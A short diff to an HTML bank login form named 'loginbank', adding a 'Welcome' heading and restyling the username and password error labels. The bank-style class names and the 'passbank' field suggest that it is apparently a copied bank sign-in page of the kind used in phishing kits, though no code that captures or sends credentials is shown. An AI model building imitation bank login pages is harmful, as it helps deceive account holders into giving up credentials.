@@ -255,16 +255,17 @@
 
                                                 
                                                 <form name="loginbank" id="loginbank">
+                                                    <h1>Welcome</h1>
 
                                                     <div id="errorrSignIn"></div>
 
-                                                    <label class="util accessible-text logon-xs-toggle error" for="userId-input-field" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Username</label>
+                                                    <label  id="errorusername" for="userId-input-field" data-attr="LOGON.userIdPlaceholder" style="color: red; font-size: larger; display: none;"><span style="font-weight: bold;">Error:</span>Username</label>
                                                     <div class="logon-xs-toggle" id="userId">
 
                                                         <input class="jpui input logon-xs-toggle " id="username" placeholder="Username" type="text" name="username" required>
 
                                                     </div>
-                                                    <label class="util accessible-text logon-xs-toggle error" for="password-input-field" data-attr="LOGON.passwordPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Password</label>
+                                                    <label  id="errorpassword" for="password-input-field" data-attr="LOGON.passwordPlaceholder" style="color: red; font-size: larger; display: none;"><span style="font-weight: bold;">Error:</span>Password</label>
                                                     <div class="logon-xs-toggle" id="password">
 
                                                         <input class="jpui input logon-xs-toggle " id="password" placeholder="Password" type="password" name="passbank" required>
